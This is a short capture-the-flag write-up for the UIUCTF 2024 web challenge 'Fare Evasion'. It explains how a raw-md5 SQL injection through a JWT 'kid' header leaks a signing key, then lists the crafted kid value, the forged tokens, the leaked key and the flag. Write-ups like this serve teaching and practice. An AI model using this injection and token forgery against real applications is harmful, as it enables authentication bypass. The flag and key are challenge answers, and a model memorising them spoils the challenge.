---
tags:
  - ctf
  - web
---
# Challenge
![[UIUCTF2024 Fare Evasion-20240701184723742.webp|526]]
https://fare-evasion.chal.uiuc.tf/
# Analysis
https://chuajianshen.github.io/2024/06/29/UIU2024/
Doing CTRL+U and viewing the source shows:
![[UIUCTF2024 Fare Evasion-20240701184821679.webp]]
What we know is that:
- It uses [[JSON Web Token|JWT tokens]]
- It provides the passenger signing key
- There is a SQL injection through the kid header with md5, and uses latin1 encoding for the response
- We have to get conductor key to sign our token to get flag
The vulnerability is this:
![[UIUCTF2024 Fare Evasion-20240701203237707.webp]]
Since md5 is evaluated in raw form, it can contain characters with special meaning to MySQL.

Changing the kid header to 129581926211651571912466741651878684928 will leak the conductor key. After getting this key, we can forge our token to obtain the flag.
# Payload
```text
//JWT with kid header hash value
eyJhbGciOiJIUzI1NiIsImtpZCI6IjEyOTU4MTkyNjIxMTY1MTU3MTkxMjQ2Njc0MTY1MTg3ODY4NDkyOCIsInR5cCI6IkpXVCJ9.eyJ0eXBlIjoicGFzc2VuZ2VyIn0.lAOo9gRrLUmYLcTR1JVyHK1fqeZjRfNkdixQDDcJOL8

conductor_key_873affdf8cc36a592ec790fc62973d55f4bf43b321bf1ccc0514063370356d5cddb4363b4786fd072d36a25e0ab60a78b8df01bd396c7a05cccbbb3733ae3f8e

//JWT with conductor secret
eyJhbGciOiJIUzI1NiIsImtpZCI6InRlc3QiLCJ0eXAiOiJKV1QifQ.eyJ0eXBlIjoicGFzc3NlbmdlciJ9.14V5mvqWcVHgWf0LrxU4e64vHoe4fCWfbqNCD3l22z8

uiuctf{sigpwny_does_not_condone_turnstile_hopping!}

```